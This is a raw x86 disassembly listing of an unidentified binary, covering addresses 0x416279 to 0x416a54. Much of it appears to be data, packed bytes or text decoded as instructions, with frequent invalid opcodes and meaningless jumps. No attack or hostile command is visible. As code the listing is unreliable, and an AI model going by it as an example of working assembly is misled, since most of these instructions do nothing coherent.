  416279:	jb     0x416277
  41627b:	sub    DWORD PTR [eax+eax*1+0x0],esi
  41627f:	xchg   edi,eax
  416280:	ror    edx,1
  416282:	daa    
  416283:	inc    esi
  416284:	push   eax
  416285:	mov    BYTE PTR [edx+0x72],dh
  416288:	sub    eax,0x176a9bda
  41628d:	fist   DWORD PTR [ecx]
  41628f:	inc    edx
  416290:	jp     0x416294
  416292:	shl    BYTE PTR [eax-0x58587582],cl
  416298:	adc    ah,ah
  41629a:	aam    0xc4
  41629c:	add    BYTE PTR [eax],al
  41629e:	(bad)  
  41629f:	hlt    
  4162a0:	adc    al,BYTE PTR [eax]
  4162a2:	add    BYTE PTR [esi-0x33fff15a],al
  4162a8:	repnz in eax,0xff
  4162ab:	push   es
  4162ac:	out    dx,eax
  4162ad:	push   0xb4016e4f
  4162b2:	cmp    ah,BYTE PTR [esi+0x3e74fea0]
  4162b8:	mov    BYTE PTR [ebx],0xfe
  4162bb:	out    dx,al
  4162bc:	cmp    edi,edi
  4162be:	retf   
  4162bf:	(bad)  
  4162c1:	int3   
  4162c2:	int3   
  4162c3:	fld    TBYTE PTR [esi-0x4d7a3334]
  4162c9:	int3   
  4162ca:	int3   
  4162cb:	int3   
  4162cc:	mov    ecx,DWORD PTR [ebx-0x74747475]
  4162d2:	mov    ecx,DWORD PTR [ebx-0x6f760075]
  4162d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162da:	retf   
  4162db:	fimul  DWORD PTR [ebp+0x2e]
  4162de:	stos   BYTE PTR es:[edi],al
  4162df:	xchg   edx,eax
  4162e0:	lods   al,BYTE PTR ds:[esi]
  4162e1:	push   cs
  4162e2:	pop    ds
  4162e3:	sahf   
  4162e4:	pop    ss
  4162e5:	inc    ebx
  4162e6:	neg    DWORD PTR [edi-0x3f660625]
  4162ec:	xchg   esp,eax
  4162ed:	call   0xe92a4bda
  4162f2:	call   0x342a4bdf
  4162f7:	xor    eax,DWORD PTR [edx]
  4162f9:	jp     0x416347
  4162fb:	push   es
  4162fc:	xor    esi,DWORD PTR [ebx]
  4162fe:	adc    BYTE PTR [edx+0x2a],bl
  416301:	mov    DWORD PTR [edx+ebx*4-0x58e68a28],edx
  416308:	jp     0x4162be
  41630a:	push   cs
  41630b:	mov    al,ds:0xa685e2c8
  416310:	mov    esi,0xedfe3c2
  416315:	loopne 0x41631f
  416317:	jne    0x4162c2
  416319:	je     0x416313
  41631b:	nop
  41631c:	(bad)  
  41631d:	fidiv  DWORD PTR [ecx+0x33336f71]
  416323:	adc    eax,0xa1333344
  416328:	xchg   ebx,eax
  416329:	sub    esi,DWORD PTR [ebx]
  41632b:	add    BYTE PTR [ebp-0x1a04fffa],ch
  416331:	(bad)  
  416332:	test   BYTE PTR [eax+0x34a79192],0xfb
  416339:	jnp    0x416354
  41633b:	aad    0xf0
  41633d:	mov    edx,0xfe470ed5
  416342:	jmp    0x2020:0x51
  416349:	inc    ebx
  41634a:	ds push edx
  41634c:	imul   edx,DWORD PTR [ebx+0x65],0x720a740d
  416353:	gs popa 
  416355:	bound  esi,QWORD PTR [ebx+0x65]
  416358:	and    dh,BYTE PTR [eax+eiz*1+0x75]
  41635c:	and    BYTE PTR [edi+0x3a],dl
  41635f:	jae    0x4163c4
  416361:	and    BYTE PTR [esi+0x6f],dh
  416364:	outs   dx,DWORD PTR ds:[esi]
  416365:	je     0x4163cc
  416367:	ins    DWORD PTR es:[edi],dx
  416368:	and    BYTE PTR [ebx+0x65],dh
  41636b:	popa   
  41636c:	gs je  0x4163c2
  41636f:	bound  ebp,QWORD PTR cs:[ebp+eiz*2+0x65]
  416374:	je     0x4163e9
  416376:	imul   ebp,DWORD PTR [edi+0x72],0x573e436d
  41637d:	jbe    0x4163f5
  41637f:	and    BYTE PTR ds:[ebx+0x65],dh
  416383:	push   ebx
  416384:	inc    ebx
  416385:	addr16 jae 0x4163ee
  416388:	popa   
  416389:	jns    0x4163f0
  41638b:	cs inc esp
  41638d:	imul   esi,DWORD PTR [edx+0x66],0x23503c20
  416394:	or     ah,BYTE PTR [ebp+0x65]
  416397:	je     0x4163d6
  416399:	jae    0x4163c4
  41639b:	jb     0x4163d9
  41639d:	cmp    eax,0x20616920
  4163a2:	arpl   WORD PTR [esi],bp
  4163a4:	cmp    al,0x3a
  4163a6:	imul   ebp,DWORD PTR [eax+0x2c],0x41655272
  4163ad:	dec    ebp
  4163ae:	je     0x416415
  4163b0:	jae    0x416356
  4163b2:	cdq    
  4163b3:	fstp   DWORD PTR [ebx-0x39]
  4163b6:	pop    ebp
  4163b7:	adc    bh,al
  4163b9:	add    eax,0xdaa4acc0
  4163be:	test   eax,0x8eb0d770
  4163c3:	cdq    
  4163c4:	sbb    BYTE PTR [ebx-0x21],ah
  4163c7:	or     edi,DWORD PTR [eax+0x3c7bf9b8]
  4163cd:	sldt   WORD PTR [eax]
  4163d0:	(bad)  
  4163d1:	push   edx
  4163d2:	mov    BYTE PTR [eax],al
	...
  4163dc:	add    BYTE PTR [eax],al
  4163de:	add    BYTE PTR [ecx+0x60],bh
  4163e1:	les    eax,FWORD PTR [eax]
	...
  4163eb:	add    al,0x4
  4163ed:	jecxz  0x416393
  4163ef:	pop    es
  4163f0:	sbb    al,0x27
  4163f2:	mov    dh,0xd3
  4163f4:	push   cs
  4163f5:	mov    ah,BYTE PTR [ebx-0x72]
  4163f8:	call   0xcf7c097
  4163fd:	cmp    al,0x5
  4163ff:	aas    
  416400:	or     DWORD PTR [ebx+0x1e],esp
  416403:	adc    BYTE PTR [ebx],cl
  416405:	add    al,0x4
  416407:	call   0x4c4:0x8504046d
  41640e:	add    al,0xe1
  416410:	jnp    0x4163e8
  416412:	xor    DWORD PTR [ebx+0xd],ebx
  416415:	in     eax,0x52
  416417:	daa    
  416418:	bound  esp,QWORD PTR [edx+0x3c]
  41641b:	sbb    DWORD PTR [edi-0x55],0x14828359
  416422:	gs pop eax
  416424:	adc    bl,BYTE PTR [edi]
  416426:	and    eax,DWORD PTR [ebx+ecx*4]
  416429:	inc    ecx
  41642a:	(bad)  
  41642c:	pop    es
  41642d:	mov    ecx,DWORD PTR [ebx-0x598ffb75]
  416433:	loop   0x416400
  416435:	push   ss
  416436:	stos   DWORD PTR es:[edi],eax
  416437:	jge    0x4163fc
  416439:	adc    eax,0x4d362b4b
  41643e:	add    al,0xcb
  416440:	cmp    edx,ebx
  416442:	mov    ecx,0x6af01722
  416447:	daa    
  416448:	scas   al,BYTE PTR es:[edi]
  416449:	push   edx
  41644a:	or     al,0x14
  41644c:	dec    esp
  41644d:	push   0xf5e60296
  416452:	into   
  416453:	mov    ecx,DWORD PTR [ebx-0x7474e78a]
  416459:	mov    eax,DWORD PTR [ebx-0x7c7c7c7d]
  41645f:	add    DWORD PTR [ebx+0xabd8383],0x3c
	...
  41646e:	add    BYTE PTR [edi],cl
  416470:	jae    0xe0a1ebe3
  416476:	pop    eax
  416477:	dec    BYTE PTR [edx+0x4d]
  41647a:	test   eax,0x19efef7e
  41647f:	add    eax,0x9a75593b
  416484:	mov    esp,esp
  416486:	mov    al,ds:0xf0fd232
  41648b:	jbe    0x41648e
  41648d:	sar    BYTE PTR [ebp+ecx*8-0x3],0x63
  416492:	xor    ebp,ebx
  416494:	idiv   BYTE PTR [ecx+0x37]
  416497:	fidivr DWORD PTR [ecx]
  416499:	sahf   
  41649a:	call   0xbd4e59cd
  41649f:	pop    ecx
  4164a0:	mov    eax,ds:0xc4ff0207
  4164a5:	and    BYTE PTR [edx+0x5f],0xf
  4164a9:	(bad)  
  4164ab:	mov    ah,0xf5
  4164ad:	pfpnacc mm4,QWORD PTR [ecx]
  4164b1:	xlat   BYTE PTR ds:[ebx]
  4164b2:	ud0    eax,DWORD PTR [ecx+0xe02efab]
  4164b9:	jg     0x4164b4
  4164bb:	adc    ebx,DWORD PTR [ecx]
  4164bd:	into   
  4164be:	xchg   esp,eax
  4164bf:	push   ebp
  4164c0:	and    ebx,DWORD PTR [ebp+0x26]
  4164c3:	iret   
  4164c4:	xor    dl,ah
  4164c6:	mov    dl,0xe6
  4164c8:	xor    al,BYTE PTR [ebp+0xd]
  4164cb:	xchg   ebp,eax
  4164cc:	(bad)  
  4164cd:	(bad)  
  4164ce:	dec    esi
  4164d0:	pop    es
  4164d1:	(bad)  
  4164d2:	(bad)  
  4164d3:	cmp    al,0xf2
  4164d5:	(bad)  
  4164d6:	(bad)  
  4164d7:	dec    DWORD PTR [ebx-0x74747475]
  4164dd:	mov    ecx,DWORD PTR [ebx+0x38b78b8b]
  4164e3:	in     eax,dx
  4164e4:	xor    BYTE PTR [esi+0x2c],al
  4164e7:	(bad)  
  4164e9:	cmp    DWORD PTR [ecx-0x14ade417],edi
  4164ef:	xor    BYTE PTR [edx-0x31],al
  4164f2:	xchg   esi,eax
  4164f3:	inc    edx
  4164f4:	imul   edx,eax,0xe
  4164f7:	pop    ebp
  4164f8:	push   eax
	...
  416501:	add    BYTE PTR [eax],al
  416503:	add    al,al
  416505:	sti    
  416506:	add    cl,BYTE PTR [ecx-0x59e20000]
  41650c:	outs   dx,BYTE PTR ds:[esi]
  41650d:	pop    edi
  41650e:	sbb    ah,BYTE PTR ds:0x4d3a6ffe
  416514:	pop    esp
  416515:	scas   eax,DWORD PTR es:[edi]
  416516:	daa    
  416517:	mov    WORD PTR [ecx-0x5ce88e8f],?
  41651d:	dec    edx
  41651e:	adc    DWORD PTR [ebp+0x118fe289],edx
  416524:	dec    ebx
  416525:	pop    ebp
  416526:	jo     0x41654b
  416528:	inc    ebx
  416529:	mov    ds,WORD PTR [esi]
  41652b:	mov    edx,0x7800007a
  416530:	add    eax,0x1bd0000
  416535:	test   DWORD PTR [eax],eax
  416537:	add    cl,dl
  416539:	push   0x54
  41653b:	xchg   esp,eax
  41653c:	(bad)  
  41653d:	mov    esi,0x239e9baa
  416542:	pop    esp
  416543:	sub    BYTE PTR ds:0x43c283b8,cl
  416549:	pop    esi
  41654a:	fild   QWORD PTR [ecx+0x20]
  41654d:	mov    ebx,0xf96b
  416552:	add    BYTE PTR [esi-0x6d],bh
  416555:	popf   
  416556:	push   eax
  416557:	shl    eax,1
  416559:	push   ds
  41655a:	data16 (bad) 
  41655c:	fimul  WORD PTR [esi]
  41655e:	add    bh,cl
  416560:	icebp  
  416561:	popf   
  416562:	pop    esi
  416563:	mov    ebp,0x5094cd23
  416568:	xor    ch,BYTE PTR [ebx]
  41656a:	(bad)  [ebx]
  41656c:	scas   eax,DWORD PTR es:[edi]
  41656d:	js     0x4165cc
  41656f:	hlt    
  416570:	add    BYTE PTR [eax],al
  416572:	aam    0xda
  416574:	(bad)  
  416575:	add    BYTE PTR [eax],al
  416577:	add    BYTE PTR [esp+eax*1],al
  41657a:	add    al,0x4
  41657c:	add    al,0x4
  41657e:	add    al,0x4
  416580:	add    al,0x6
  416582:	shl    eax,cl
  416584:	inc    ebp
  416585:	inc    ebp
  416586:	inc    ebp
  416587:	inc    ebp
  416588:	inc    ebp
  416589:	inc    ebp
  41658a:	inc    ebp
  41658b:	inc    ebp
  41658c:	inc    ebp
  41658d:	test   DWORD PTR [ebp+0x3cd581ac],eax
  416593:	or     ch,dl
  416595:	not    DWORD PTR [ebx+0x39d9987e]
  41659b:	dec    ebx
  41659c:	jmp    0xb20d2728
  4165a1:	mov    WORD PTR [esi+0x3ed7a72],cs
  4165a7:	test   DWORD PTR [ebp-0x7a7a7eb4],eax
  4165ad:	aam    0xd9
  4165af:	test   DWORD PTR [ebp-0x62909b38],eax
  4165b5:	clc    
  4165b6:	dec    edx
  4165b7:	xor    dh,al
  4165b9:	aam    0xa7
  4165bb:	jne    0x4165cf
  4165bd:	push   0x8684c05f
  4165c2:	je     0x41658d
  4165c4:	pop    ebp
  4165c5:	mov    ah,0xc4
  4165c7:	cli    
  4165c8:	cmp    eax,0x408fcc85
  4165cd:	icebp  
  4165ce:	(bad)
  4165d1:	int3   
  4165d2:	repz out 0xb5,eax
  4165d5:	pop    DWORD PTR [esi+0x34]
  4165d8:	mov    WORD PTR ds:0xc6ad3da1,ds
  4165de:	sti    
  4165df:	out    0xea,al
  4165e1:	mov    ss,WORD PTR [eax]
  4165e3:	push   esi
  4165e4:	sub    cl,ah
  4165e6:	hlt    
  4165e7:	fnstenv [ebx-0x6d89e8d7]
  4165ed:	pop    esp
  4165ee:	lock inc ebp
  4165f0:	jmp    0x1a02fa4d
  4165f5:	int3   
  4165f6:	int3   
  4165f7:	ret    
  4165f8:	daa    
  4165f9:	int3   
  4165fa:	int3   
  4165fb:	int3   
  4165fc:	jne    0x416673
  4165fe:	jne    0x416675
  416600:	jne    0x416677
  416602:	jne    0x416679
  416604:	jne    0x416612
  416606:	or     DWORD PTR [edx],ebp
  416608:	(bad)  
  416609:	(bad)  
  41660a:	(bad)  
  41660b:	(bad)  
  41660c:	(bad)  
  41660d:	(bad)  
  41660e:	(bad)  
  41660f:	(bad)  
  416610:	pcmpeqb mm6,QWORD PTR [edx+ebx*8-0xc]
  416615:	mov    ebp,0x1ffa90ae
  41661a:	outs   dx,DWORD PTR ds:[esi]
  41661b:	xchg   ebx,eax
  41661c:	into   
  41661d:	xor    ecx,DWORD PTR [edi+0x3b]
  416620:	nop
  416621:	ins    DWORD PTR es:[edi],dx
  416622:	aas    
  416623:	and    BYTE PTR [ebx+0x4d],0xc6
  416627:	ret    0x72c7
  41662a:	imul   esi,DWORD PTR [esp+esi*2+0x7c],0xffffffa9
  41662f:	fstp   QWORD PTR [ebx+0x942fa71]
  416635:	mov    eax,ds:0xee30bd09
  41663a:	xchg   BYTE PTR [edi+esi*2],bl
  41663d:	push   ds
  41663e:	jg     0x416631
  416640:	adc    BYTE PTR [ebx+ecx*4+0x2a],0x45
  416645:	jmp    0x5876e621
  41664a:	je     0x4166c0
  41664c:	jmp    0x28d6:0x747433eb
  416653:	shl    BYTE PTR [eax+eax*1+0x13],0xe0
  416658:	les    ecx,FWORD PTR [ebp+0x4e]
  41665b:	mov    ds:0xb7105023,eax
  416660:	sub    al,0xfe
  416662:	pop    edi
  416663:	test   esp,esp
  416665:	stos   BYTE PTR es:[edi],al
  416666:	fnstsw WORD PTR [ecx+0x4e]
  416669:	push   cs
  41666a:	repnz call 0xcc00:0xb7a2
  416672:	add    BYTE PTR [bx+si],al
  416675:	shl    BYTE PTR [ecx+0x0],1
  416678:	add    BYTE PTR [eax],al
  41667a:	or     al,0xc
  41667c:	or     al,0xc
  41667e:	or     al,0xc
  416680:	or     al,0xc
  416682:	or     al,0x9e
  416684:	or     BYTE PTR [esi-0x5729992f],0x19
  41668b:	pop    edi
  41668c:	jg     0x41669f
  41668e:	icebp  
  41668f:	mov    edx,fs
  416691:	sub    eax,0x7b2208f6
  416696:	pminsw mm5,mm3
  416699:	sar    ch,0x0
	...
  4166a4:	inc    ebp
  4166a5:	inc    ebp
  4166a6:	sbb    eax,0x452a185b
  4166ab:	inc    ebp
  4166ac:	fist   DWORD PTR [edx+0x44]
  4166af:	and    DWORD PTR [ecx],ecx
  4166b1:	pop    ds
  4166b2:	mov    ah,0xac
  4166b4:	jae    0x416695
  4166b6:	xlat   BYTE PTR ds:[ebx]
  4166b7:	mul    DWORD PTR [ebx]
  4166b9:	xchg   edx,eax
  4166ba:	ret    
  4166bb:	sbb    al,0x97
  4166bd:	pop    esp
  4166be:	jle    0x4166e0
  4166c0:	mov    WORD PTR [esi],?
  4166c2:	mov    eax,ds:0xc0970d0c
  4166c7:	xor    BYTE PTR [ebp+0x2c],dh
  4166ca:	jae    0x416740
  4166cc:	or     dh,BYTE PTR [edx+0x3e]
  4166cf:	popa   
  4166d0:	gs jbe 0x416746
  4166d3:	inc    ecx
  4166d4:	arpl   WORD PTR [ebp+0x74],sp
  4166d7:	cmp    al,0x62
  4166d9:	push   esp
  4166da:	imul   esp,DWORD PTR [ebp+0x2e],0x206f2073
  4166e1:	or     al,BYTE PTR [ecx+0x73]
  4166e4:	push   ebx
  4166e5:	jae    0x41674c
  4166e7:	bound  eax,QWORD PTR ds:[ecx+0x65]
  4166eb:	bound  ebp,QWORD PTR [ebp+0x73]
  4166ee:	bound  esp,QWORD PTR [eax]
  4166f0:	and    BYTE PTR [eax],ah
  4166f2:	push   eax
  4166f3:	arpl   WORD PTR gs:[ebx+0x65],si
  4166f7:	je     0x41673a
  4166f9:	push   edi
  4166fa:	jbe    0x41675f
  4166fc:	jae    0x41673a
  4166fe:	je     0x41676d
  416700:	je     0x416722
  416702:	arpl   WORD PTR cs:[esi],bp
  416705:	gs jae 0x41672a
  416708:	jb     0x416748
  41670a:	outs   dx,BYTE PTR ds:[esi]
  41670b:	gs gs cmp eax,0x206e7265
  416712:	outs   dx,DWORD PTR ds:[esi]
  416713:	jne    0x416788
  416715:	cs push edi
  416717:	dec    ebp
  416718:	arpl   WORD PTR [di+0x3e],si
  41671c:	gs sub DWORD PTR cs:[ecx+0x54],ebp
  416721:	gs and ch,BYTE PTR gs:[ebx+eiz*1+0x65]
  416727:	jb     0x41679d
  416729:	or     ah,BYTE PTR [ebp+0x78]
  41672c:	outs   dx,DWORD PTR ds:[esi]
  41672d:	outs   dx,DWORD PTR ds:[esi]
  41672e:	xchg   BYTE PTR [ecx-0x4],cl
  416731:	mov    ecx,?
  416733:	inc    ebp
  416734:	inc    ebp
  416735:	sahf   
  416736:	mov    cl,0x45
  416738:	inc    ebp
  416739:	push   edi
  41673a:	mov    ebp,0xc045a2
  41673f:	clc    
  416740:	sbb    BYTE PTR [ebp-0x29c72b73],0x7e
  416747:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416748:	in     eax,dx
  416749:	adc    eax,0x509590d1
  41674e:	rcr    BYTE PTR [ebx+0x3b],0x90
  416752:	out    0xdd,al
  416754:	neg    BYTE PTR [edi]
  416756:	rol    al,0xc0
  416759:	jno    0x41677c
  41675b:	dec    edx
  41675c:	mov    eax,ds:0x997bc0e9
  416761:	dec    esi
  416762:	jbe    0x4167b9
  416764:	aaa    
  416765:	out    0xa4,eax
  416767:	mov    BYTE PTR [edi-0x26c62efd],ch
  41676d:	push   ds
  41676e:	fwait
  41676f:	and    esp,DWORD PTR [eax+0x35a58a27]
  416775:	mov    dl,0xc0
  416777:	shl    dl,0x83
  41677a:	push   ecx
  41677b:	rol    al,0xc0
  41677e:	mov    ecx,DWORD PTR [ebx-0x74747475]
  416784:	mov    ecx,DWORD PTR [ebx-0x3c6b8d75]
  41678a:	je     0x416800
  41678c:	je     0x416802
  41678e:	je     0x416804
  416790:	je     0x416806
  416792:	je     0x416794
  416794:	add    BYTE PTR [ecx],cl
  416796:	push   esi
  416797:	and    DWORD PTR [ecx+0x43],ecx
  41679a:	ins    BYTE PTR es:[edi],dx
  41679b:	retf   0x457c
  41679e:	sub    ebp,edi
  4167a0:	cmc    
  4167a1:	in     al,0x2a
  4167a3:	(bad)  
  4167a4:	mov    eax,0x924ea44d
  4167a9:	test   DWORD PTR [ebx],esp
  4167ab:	xor    al,0xa4
  4167ad:	add    BYTE PTR [eax],al
  4167af:	adc    BYTE PTR [edi+0x0],al
  4167b2:	add    BYTE PTR [esi-0x54ffff78],bl
  4167b8:	cdq    
  4167b9:	mov    eax,0x35df1cf9
  4167be:	pop    eax
  4167bf:	mov    ds,WORD PTR [edi]
  4167c1:	jge    0x416773
  4167c3:	push   edi
  4167c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167c5:	fwait
  4167c6:	jns    0x41677c
  4167c8:	nop
  4167c9:	test   ch,dl
  4167cb:	mov    bl,0x91
  4167cd:	mov    ecx,0xd4000094
  4167d2:	jmp    0xfd00:0x3806
  4167d9:	inc    esi
  4167da:	lods   al,BYTE PTR ds:[esi]
  4167db:	fcom   DWORD PTR [eax]
  4167dd:	sar    esp,0xb1
  4167e0:	fisub  DWORD PTR [esi]
  4167e2:	in     eax,0xfe
  4167e4:	imul   esp,DWORD PTR [edi],0x42240125
  4167ea:	sahf   
  4167eb:	mov    al,0x5a
  4167ed:	push   ebp
  4167ee:	push   eax
  4167ef:	push   ebp
  4167f0:	repz aas 
  4167f2:	xor    DWORD PTR [eax+eiz*2],esi
  4167f5:	fdivr  QWORD PTR [edi]
  4167f7:	scas   al,BYTE PTR es:[edi]
  4167f8:	jns    0x4167fe
  4167fa:	cwde   
  4167fb:	add    BYTE PTR [eax],al
  4167fd:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4167ff:	add    BYTE PTR [eax],al
  416801:	add    BYTE PTR [ebx],dh
  416803:	xor    esi,DWORD PTR [ebx]
  416805:	xor    esi,DWORD PTR [ebx]
  416807:	xor    esi,DWORD PTR [ebx]
  416809:	xor    esi,DWORD PTR [ebx]
  41680b:	loope  0x4167c4
  41680d:	inc    edx
	...
  416816:	add    BYTE PTR [esp+ecx*1],cl
  416819:	int3   
  41681a:	sti    
  41681b:	sahf   
  41681c:	sar    DWORD PTR [eax+0x62],cl
  41681f:	retf   
  416820:	pop    es
  416821:	cs cmp eax,0x4353b234
  416827:	or     al,BYTE PTR [ebx+0x7ea7ce3c]
  41682d:	outs   dx,DWORD PTR ds:[esi]
  41682e:	mov    esi,0xc0c422a
  416833:	and    eax,0xfa56dea6
  416838:	mov    ecx,0x84bf6ba7
  41683d:	push   cs
  41683e:	in     al,0x3e
  416840:	scas   al,BYTE PTR es:[edi]
  416841:	mov    ebp,0xfedae113
  416846:	ffreep st(4)
  416848:	addr16 test al,0xfa
  41684b:	in     al,0xd0
  41684d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41684e:	push   ss
  41684f:	or     BYTE PTR [esp+ecx*1],0x23
  416853:	retf   0xcde
  416856:	or     al,0xb6
  416858:	mov    ebx,0xd5000cdc
  41685d:	fldlg2 
  41685f:	mov    bh,0x62
  416861:	xchg   edi,eax
  416862:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416863:	(bad)  
  416864:	shl    BYTE PTR [ecx+edx*8-0x399f9e5e],cl
  41686b:	jno    0x4168dd
  41686d:	sbb    eax,0xbf069da8
  416872:	mul    bl
  416874:	add    BYTE PTR [eax],al
  416876:	add    BYTE PTR [ebp-0x53fffffb],ch
  41687c:	jns    0x41687e
  41687e:	add    BYTE PTR [eax],al
  416880:	inc    ebp
  416881:	inc    ebp
  416882:	inc    ebp
  416883:	inc    ebp
  416884:	inc    ebp
  416885:	inc    ebp
  416886:	inc    ebp
  416887:	inc    ebp
  416888:	inc    ebp
  416889:	add    BYTE PTR [esi+edi*8-0xe],0x7b
  41688e:	repz call 0xcb55:0x2635f7d3
  416896:	daa    
  416897:	dec    edi
  416898:	jno    0x41684f
  41689a:	fcmovbe st,st(6)
  41689c:	cwde   
  41689d:	cmovne ecx,DWORD PTR [ecx+ebp*1-0x75]
  4168a2:	mov    ecx,DWORD PTR [ebx-0x74747475]
  4168a8:	mov    ecx,DWORD PTR [ebx-0x6387fbfc]
  4168ae:	xchg   edi,eax
  4168af:	inc    esp
  4168b0:	add    al,0x4
  4168b2:	mov    cl,0x5b
  4168b4:	leave  
  4168b5:	dec    ecx
  4168b6:	lahf   
  4168b7:	mov    ds:0x93c18ef0,al
  4168bc:	mov    ah,0x11
  4168be:	add    edi,ecx
  4168c0:	xchg   BYTE PTR [ecx-0x719e2e5f],bh
  4168c6:	stos   DWORD PTR es:[edi],eax
  4168c7:	add    al,BYTE PTR [esi+0x33dec7e9]
  4168cd:	jne    0x4168e7
  4168cf:	scas   al,BYTE PTR es:[edi]
  4168d0:	xchg   esi,eax
  4168d1:	nop
  4168d2:	es clc 
  4168d4:	enter  0x404,0xa6
  4168d8:	pop    ebp
  4168d9:	add    al,0x4
  4168db:	int3   
  4168dc:	pop    ebp
  4168dd:	xchg   ebx,eax
  4168de:	add    al,0xff
  4168e0:	or     BYTE PTR [edi-0x31],dl
  4168e3:	(bad)  
  4168e4:	mov    ?,WORD PTR [eax+0x0]
  4168e7:	int    0xb
  4168e9:	mov    dh,0xc2
  4168eb:	xchg   ebx,eax
  4168ec:	stos   DWORD PTR es:[edi],eax
  4168ed:	out    dx,al
  4168ee:	push   ss
  4168ef:	fild   DWORD PTR [ecx]
  4168f1:	daa    
  4168f2:	cdq    
  4168f3:	test   DWORD PTR [eax+0x61],ecx
  4168f6:	sbb    al,0x78
  4168f8:	(bad)  
  4168f9:	(bad)  
  4168fa:	inc    DWORD PTR [esi-0x17]
  4168fd:	dec    edx
  4168fe:	adc    BYTE PTR [ebp-0x7e3fe26b],0xc1
  416905:	ins    DWORD PTR es:[edi],dx
  416906:	(bad)  
  416909:	aaa    
  41690a:	pop    ss
  41690b:	and    al,0x87
  41690d:	mov    bh,0x9
  41690f:	xchg   ebp,eax
  416910:	sahf   
  416911:	sbb    ch,ah
  416913:	ins    DWORD PTR es:[edi],dx
  416914:	loope  0x416939
  416916:	mov    ebx,0x78ffffd2
  41691b:	shl    edx,cl
  41691d:	(bad)  
  41691e:	(bad)  
  41691f:	push   DWORD PTR [ebx]
  416921:	xor    esi,DWORD PTR [ebx]
  416923:	xor    esi,DWORD PTR [ebx]
  416925:	xor    esi,DWORD PTR [ebx]
  416927:	xor    esi,DWORD PTR [ebx]
  416929:	sbb    al,0x23
  41692b:	xchg   ebx,eax
	...
  416934:	add    BYTE PTR [ebp+0x75],dh
  416937:	pop    edi
  416938:	and    DWORD PTR [ecx-0x78e43439],0x1e3224d2
  416942:	or     al,0x81
  416944:	sub    DWORD PTR [edx+0x79],ebx
  416947:	mov    ds:0x15e15f95,al
  41694c:	and    BYTE PTR [eax],ah
  41694e:	pop    ecx
  41694f:	jne    0x4169c6
  416951:	xor    cl,ah
  416953:	jne    0x4169ca
  416955:	add    DWORD PTR [esi],edi
  416957:	jne    0x4169ce
  416959:	mov    BYTE PTR [ecx],bh
  41695b:	push   edx
  41695c:	sbb    al,0x51
  41695e:	inc    esp
  41695f:	mov    ebp,0xa7800110
  416964:	push   esi
  416965:	daa    
  416966:	jae    0x4169d7
  416968:	sbb    dh,BYTE PTR [ebx+eax*4-0x799e8696]
  41696f:	aad    0x3f
  416971:	jne    0x41693f
  416973:	in     eax,0x30
  416975:	push   ebp
  416976:	jo     0x416944
  416978:	int3   
  416979:	int3   
  41697a:	xchg   DWORD PTR [esi],eax
  41697c:	repnz fstp TBYTE PTR [ebx+0x74712c32]
  416983:	push   ecx
  416984:	jb     0x41695a
  416986:	inc    esi
  416987:	aam    0xca
  416989:	shl    BYTE PTR [eax+0x38],cl
  41698c:	dec    BYTE PTR [eax+0x3e4e86d3]
  416992:	arpl   WORD PTR [edi],di
  416994:	inc    ebx
  416995:	mov    dl,0x16
  416997:	mov    dh,0x2
  416999:	inc    eax
  41699a:	or     al,BYTE PTR [ebx+0x11]
  41699d:	int3   
  41699e:	int3   
  41699f:	iret   
  4169a0:	push   cs
  4169a1:	int3   
  4169a2:	int3   
  4169a3:	int3   
  4169a4:	add    al,0x4
  4169a6:	add    al,0x4
  4169a8:	add    al,0x4
  4169aa:	add    al,0x4
  4169ac:	add    al,0xa4
  4169ae:	xor    al,0x98
	...
  4169b8:	add    BYTE PTR [eax],al
  4169ba:	add    BYTE PTR ds:0xc974531a,al
  4169c0:	mov    dh,0xe2
  4169c2:	xchg   ecx,eax
  4169c3:	xchg   ecx,eax
  4169c4:	mov    ds:0x632ddddc,al
  4169c9:	nop
  4169ca:	cmpxchg DWORD PTR [esi],ecx
  4169cd:	repz xlat BYTE PTR ds:[ebx]
  4169cf:	jle    0x416a48
  4169d1:	fisttp DWORD PTR [eax+eax*1-0x1b1dea00]
  4169d8:	pop    ss
  4169d9:	and    al,0xe4
  4169db:	push   edx
  4169dc:	adc    DWORD PTR [ebx],edx
  4169de:	xor    DWORD PTR [edi+0x4510da],eax
  4169e4:	or     eax,0x2e616499
  4169e9:	ins    BYTE PTR es:[edi],dx
  4169ea:	(bad)  
  4169eb:	iret   
  4169ec:	push   ebx
  4169ed:	sbb    bl,al
  4169ef:	cs mov cs,esi
  4169f2:	add    BYTE PTR [eax],al
  4169f4:	or     dl,ch
  4169f6:	xchg   ebx,eax
  4169f7:	add    BYTE PTR [eax],al
  4169f9:	add    eax,0xff00c24c
  4169fe:	dec    ebp
  4169ff:	mov    ds:0x73a5dab7,eax
  416a04:	hlt    
  416a05:	add    DWORD PTR [esi+0x1],ebx
  416a08:	mov    ds:0xb5286409,eax
  416a0d:	cmp    al,0xe1
  416a0f:	dec    eax
  416a10:	icebp  
  416a11:	in     al,dx
  416a12:	xchg   si,ax
  416a14:	sbb    DWORD PTR [ebp+0x65],esi
  416a17:	and    BYTE PTR [ebx+0xd],dl
  416a1a:	ins    DWORD PTR es:[edi],dx
  416a1b:	push   edi
  416a1c:	imul   esp,DWORD PTR gs:[eax],0x65417973
  416a23:	ds data16 cmp ah,BYTE PTR fs:[bx+si]
  416a29:	bound  edx,QWORD PTR [eax+0x70]
  416a2c:	jae    0x416a7b
  416a2e:	arpl   WORD PTR gs:[edx+0x53],sp
  416a32:	je     0x416a6e
  416a34:	ds jb  0x416aad
  416a37:	and    BYTE PTR [ebx+0x22],dl
  416a3a:	and    BYTE PTR ds:[ecx+0x68],bh
  416a3e:	ins    DWORD PTR es:[edi],dx
  416a3f:	jb     0x416ab6
  416a41:	sub    al,0x2c
  416a43:	jbe    0x416aad
  416a45:	jae    0x416ac0
  416a47:	fs ins DWORD PTR es:[edi],dx
  416a49:	jb     0x416ab7
  416a4b:	jbe    0x416ab2
  416a4d:	jo     0x416a9c
  416a4f:	ins    DWORD PTR es:[edi],dx
  416a50:	ins    DWORD PTR es:[edi],dx
  416a51:	and    BYTE PTR [esi+0x3d],cl
  416a54:	cmp    al,0x69
